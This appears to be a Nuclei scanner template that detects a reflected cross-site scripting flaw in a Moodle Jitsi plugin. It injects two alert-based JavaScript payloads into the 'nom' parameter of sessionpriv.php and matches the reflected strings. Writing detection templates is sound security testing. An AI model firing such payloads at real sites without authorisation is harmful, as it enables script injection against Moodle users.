info:
  name: moodle jitsi plugin XSS
  author: aceseven (digisec360)
  description: Cross-site Scripting in moodle jitsi plugin
  severity: critical
  tags: moodle,jitsi,xss

requests:
  - payloads:
      fuzz: 
        - test_user');alert(1);//
        - test');alert(document.domain);//
    raw: 
      - |
        GET /mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2Ftargetdomain.com&nom=§fuzz§&ses=test_user&t=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept: */*
        Referer: {{BaseURL}}
        Connection: keep-alive
  
    
    attack: sniper
    
    matchers:
     - type: word
       condition: or
       words:
         - "alert(1);"
         - "alert(document.domain);"
